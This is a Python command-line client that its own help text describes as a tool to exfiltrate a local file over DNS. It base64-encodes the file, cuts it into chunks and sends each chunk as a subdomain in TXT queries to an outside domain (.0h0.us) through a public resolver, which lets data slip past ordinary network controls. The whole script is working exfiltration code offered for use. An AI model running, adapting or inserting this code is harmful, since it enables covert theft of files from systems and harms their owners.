
import socket
import dnslib
import argparse,sys,time, os
import base64
from hashlib import md5




def tcp_dns_record(ns,host, qtype, server,tcp):

    if isinstance(qtype, str):
        query = dnslib.DNSRecord.question(host, qtype=qtype)
    else:
        query = dnslib.DNSRecord(q=dnslib.DNSQuestion(host, qtype))
    query_data = query.pack()
    #print("sending:",ns, host,qtype,ns,tcp,query_data)
    record = query.send(ns,tcp=tcp)
    #print("response:",record)
    return record

def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def progressBar(c, tot, status):
    bar = 40
    filled = int(round(bar * c / float(tot)))

    pct = round(100.0 * c / float(tot), 1)
    barstr = '=' * filled + '-' * (bar - filled)

    sys.stdout.write('[%s] %s%s ...%s\r' % (barstr, pct, '%', status))
    sys.stdout.flush()

if __name__ == "__main__":


    p = argparse.ArgumentParser(description="DNS Client")
    p.add_argument("--file","-f",
                    help="local file you want to exfiltrate", required = True)
    p.add_argument("--server","-s",
                    metavar="<address:port>",
                    help="Server address:port  (port is optional)")
    p.add_argument("--nameserver","-ns",default="8.8.8.8",
                    metavar="<address:port>",
                    help="Name Server address:port (default:8.8.8.8:53) (port is optional)")
                    
    p.add_argument("--tcp",action='store_true',default=False,
                    help="Use TCP (default: UDP)")
    
    args = p.parse_args()

    address,_,port = args.server.partition(':')
    port = str(port or 53)


    
    f = open(args.file, 'rb') 
    content = f.read() 
    
    hashedWord = md5(content).hexdigest()

    content_encoded = base64.standard_b64encode(content)

    #Cut the string into an array of strings of 63 characters or less
    chunked_content = chunkstring(content_encoded,63-15)
    
    #Send the header query

    #print("tcp:",args.tcp, "address:",address)
    tcp_dns_record(args.nameserver,os.path.basename(args.file)+"|"+str(len(content_encoded))+"|"+hashedWord+".0h0.us", dnslib.QTYPE.TXT,address,args.tcp)
    
    count =0 
    #print (len(content_encoded))
    done = ""
    for chunk in chunked_content:
        count +=len(chunk)
        chunk = chunk.decode('utf-8')
        #print(chunk, count)
        progressBar(count, len(content_encoded), status="Sending file "+args.file+ " to "+address+":"+port)
        
        r = tcp_dns_record(args.nameserver,hashedWord[:4]+chunk+".0h0.us", dnslib.QTYPE.TXT,address,args.tcp)
        
        resp = dnslib.DNSRecord.parse(r)
        if len(resp.rr)==2:
            done = str(resp.rr[1].rdata)
        status = str(resp.rr[0].rdata)
        if (status[1:-1]!=chunk):
            print("ERROR -  chunks different: ", status,chunk)

    print("File sent: ",done)

    


